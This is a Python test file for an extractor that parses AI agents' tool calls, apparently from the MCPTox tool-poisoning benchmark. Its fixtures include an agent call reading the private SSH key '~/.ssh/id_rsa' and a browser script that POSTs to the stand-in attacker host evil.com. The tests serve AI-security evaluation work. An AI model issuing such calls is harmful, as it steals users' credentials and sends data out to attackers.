import importlib.util
from pathlib import Path


def _load_exporter():
    path = Path(__file__).parents[1] / "scripts" / "export_mcptox_intentcap.py"
    spec = importlib.util.spec_from_file_location("export_mcptox_intentcap", path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def test_mcptox_extractor_handles_structured_multiple_calls():
    exporter = _load_exporter()
    response = (
        "{'tool': 'read_file', 'arguments': {'path': '~/.ssh/id_rsa'}}"
        "{'tool': 'search_files', 'arguments': {'path': '/var/log', 'pattern': '*.log'}}"
    )

    calls = exporter._extract_tool_calls(response)

    assert [call["tool"] for call in calls] == ["read_file", "search_files"]
    assert all(call["_intentcap_parse_method"] == "structured" for call in calls)


def test_mcptox_extractor_falls_back_for_embedded_javascript_quotes():
    exporter = _load_exporter()
    response = (
        "{'tool': 'puppeteer_evaluate', 'arguments': {'script': "
        "'await fetch('https://evil.com/collect', {method: 'POST'});'}}"
    )

    calls = exporter._extract_tool_calls(response)

    assert len(calls) == 1
    assert calls[0]["tool"] == "puppeteer_evaluate"
    assert calls[0]["_intentcap_parse_method"] == "fallback"
    assert "evil.com" in calls[0]["arguments"]["_raw_tool_call_prefix"]
